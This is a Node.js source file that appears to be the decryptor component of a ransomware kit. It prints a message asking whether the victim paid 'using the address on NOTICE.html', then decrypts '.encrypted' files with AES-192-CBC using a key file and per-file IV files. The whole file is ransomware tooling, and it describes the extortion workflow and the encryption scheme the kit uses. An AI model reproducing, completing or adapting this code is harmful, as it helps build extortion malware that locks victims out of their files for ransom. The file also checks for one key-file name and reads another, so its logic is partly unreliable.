const {
	readFileSync,
	existsSync,
	readdirSync,
	createReadStream,
	createWriteStream,
	unlinkSync,
} = require('fs');
const { join, extname, dirname } = require('path');
const { createDecipheriv } = require('crypto');

//* These code ensure the directory name is correct
let directory;
if (process.pkg) {
	//*  It is run as an executable
	directory = dirname(process.execPath);
} else {
	//*  It is run with nodejs
	directory = __dirname;
}

if (!existsSync(join(directory, 'device_key.dat'))) {
	console.log('No decryption file found yet. Did you pay us using the address on NOTICE.html?');
	process.exit(1);
}

const DEVICE_KEY = Buffer.from(readFileSync(join(directory, 'DEVICE_KEY.dat')));

const files = readdirSync(directory);

for (let i = 0; i < files.length; i++) {
	const filename = files[i];

	let encrypted;
	let iv;
	if (extname(filename) === '.encrypted') {
		encrypted = filename;
		iv = `${filename.split('.').slice(0, -1).join('.')}.iv`;
	} else if (extname(filename) === '.iv') {
		iv = filename;
		encrypted = `${filename.split('.').slice(0, -1).join('.')}.encrypted`;
	} else {
		continue;
	}

	files.splice(files.indexOf(encrypted), 1);
	files.splice(files.indexOf(iv), 1);

	iv = join(directory, iv);
	encrypted = join(directory, encrypted);

	const IV_DATA = Buffer.from(readFileSync(iv).toString(), 'hex');

	const decipher = createDecipheriv('aes-192-cbc', DEVICE_KEY, IV_DATA);

	const input = createReadStream(encrypted);
	const output = createWriteStream(encrypted.split('.').slice(0, -1).join('.'));

	input
		.pipe(decipher)
		.pipe(output)
		.on('finish', () => {
			unlinkSync(iv);
			unlinkSync(encrypted);
		});
}

console.log('All your files have been decrypted');
